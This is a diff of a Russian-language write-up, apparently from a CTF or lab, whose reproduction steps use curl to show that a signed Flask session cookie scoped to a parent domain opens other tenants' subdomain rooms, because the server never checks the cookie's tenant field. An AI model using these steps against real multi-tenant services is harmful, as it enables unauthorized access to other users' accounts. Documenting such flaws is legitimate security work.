@@ -21,20 +21,20 @@
 
 ## Шаги воспроизведения
 1. **Регистрация** (свой «ключ» делаем сами — заходи кто хочешь):
-   ```
+   ```bash
    curl --noproxy '*' -c jar.txt -X POST 'http://188.243.222.16.nip.io:30101/rent' \
         --data 'name=kvestolog&password=Parol123!'
    ```
    Готова комната `http://kvestolog.188.243.222.16.nip.io:30101/`.
 2. **Вход в свою комнату:**
-   ```
+   ```bash
    curl --noproxy '*' -c jar.txt -X POST 'http://kvestolog.188.243.222.16.nip.io:30101/enter' \
         --data 'password=Parol123!'
    ```
    Ответ: `Set-Cookie: klyuch=eyJyIjoia3Zlc3RvbG9nIn0.…; Domain=188.243.222.16.nip.io; Max-Age=7200`.
    Полезная нагрузка cookie: `{"r":"kvestolog"}` (Flask/itsdangerous).
 3. **Один ключ — все двери:** сервер на `GET /` проверяет только подпись cookie, но **не сверяет** `r` с арендатором из Host:
-   ```
+   ```bash
    curl --noproxy '*' -b jar.txt 'http://upravdom.188.243.222.16.nip.io:30101/'
    ```
    Отдаёт комнату upravdom как вошедшему.
